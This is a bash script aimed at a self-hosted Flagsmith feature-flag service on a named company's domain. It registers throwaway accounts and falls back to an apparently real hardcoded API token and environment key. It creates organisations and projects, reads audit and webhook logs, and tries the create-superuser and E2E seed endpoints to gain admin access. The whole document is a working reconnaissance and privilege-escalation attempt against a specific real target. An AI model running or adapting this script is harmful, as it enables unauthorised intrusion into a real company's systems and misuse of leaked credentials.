#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# Register fresh account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" -H "Accept: application/json" \
  -d '{"email":"kw-v9-x@proton.me","password":"Xk9mPw3nRt7v!9","first_name":"V","last_name":"9"}' --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"

if [ -z "$KEY" ]; then
  KEY="52345f7dcce985368c2efdbb96648f4e0da25a40"
  EKEY="XmdKkEuf4ysw9pmxoLw9vc"
  PROJ=26
else
  OID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/organisations/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d '{"name":"v9"}' --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  PROJ=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"v\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
  EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"name\":\"v\",\"project\":$PROJ}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
fi
echo "Env: $EKEY"

# Check audit logs for webhook test results
echo "=== AUDIT LOGS ==="
curl -s "https://flagsmith.koinworks.com/api/v1/audit/?project=${PROJ}&page_size=20" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" -H "Accept: application/json" --max-time 10
echo ""

# Check webhook delivery logs
echo "=== WEBHOOK LOGS ==="
curl -s "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" -H "Accept: application/json" --max-time 10
echo ""

# Try to access Flagsmith's Django admin create-superuser endpoint
echo "=== CREATE SUPERUSER ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/create-superuser/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d '{"email":"kw-super@proton.me","password":"Super2026!Xk","first_name":"S","last_name":"U"}' --max-time 10
echo ""

# Try Flagsmith's E2E endpoint (might create admin)
echo "=== E2E SEEDS ==="
curl -s -X POST "https://flagsmith.koinworks.com/api/v1/e2e/seeds/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" --max-time 10
echo ""

# Try Django manage commands endpoint
echo "=== MANAGE ==="
curl -s "https://flagsmith.koinworks.com/api/v1/users/me/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" -H "Accept: application/json" --max-time 10
echo ""
